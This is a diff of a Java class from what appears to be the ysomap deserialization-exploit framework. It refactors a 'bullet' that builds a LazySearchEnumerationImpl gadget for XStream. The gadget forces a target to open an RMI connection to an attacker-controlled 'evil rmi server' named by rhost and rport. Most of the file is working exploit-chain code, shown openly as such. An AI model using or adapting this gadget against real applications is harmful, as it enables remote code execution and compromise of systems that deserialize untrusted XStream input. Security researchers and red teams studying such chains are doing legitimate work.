@@ -4,6 +4,7 @@ import com.sun.jndi.rmi.registry.RegistryContext;
 import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
 import sun.rmi.registry.RegistryImpl_Stub;
 import sun.rmi.server.UnicastRef;
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.jdk.rmi.RMIConnectBullet;
 import ysomap.common.annotation.*;
@@ -18,7 +19,7 @@ import ysomap.core.util.ReflectionHelper;
 @Details("向外部发起RMI连接")
 @Targets({Targets.XSTREAM})
 @Authors({Authors.WH1T3P1G})
-public class LazySearchEnumerationImplBullet implements Bullet<LazySearchEnumerationImpl> {
+public class LazySearchEnumerationImplBullet extends AbstractBullet<LazySearchEnumerationImpl> {
 
     @NotNull
     @Require(name = "rhost", detail = "Remote RMI Server Host to Connect, plz running a evil rmi server")
@@ -32,8 +33,8 @@ public class LazySearchEnumerationImplBullet implements Bullet<LazySearchEnumera
     public LazySearchEnumerationImpl getObject() throws Exception {
         RegistryContext ctx = ReflectionHelper.createWithoutConstructor(RegistryContext.class);
         Bullet bullet = new RMIConnectBullet();
-        ReflectionHelper.set(bullet, "rhost", rhost);
-        ReflectionHelper.set(bullet, "rport", rport);
+        bullet.set("rhost", rhost);
+        bullet.set("rport", rport);
         RegistryImpl_Stub stub = new RegistryImpl_Stub((UnicastRef)bullet.getObject());
         ReflectionHelper.setFieldValue(ctx, "host", rhost);
         ReflectionHelper.setFieldValue(ctx, "port", Integer.parseInt(rport));
@@ -48,8 +49,8 @@ public class LazySearchEnumerationImplBullet implements Bullet<LazySearchEnumera
 
     public static Bullet newInstance(Object... args) throws Exception {
         LazySearchEnumerationImplBullet bullet = new LazySearchEnumerationImplBullet();
-        ReflectionHelper.set(bullet, "rhost", args[0]);
-        ReflectionHelper.set(bullet, "rport", args[1]);
+        bullet.set("rhost", args[0]);
+        bullet.set("rport", args[1]);
         return bullet;
     }
 }
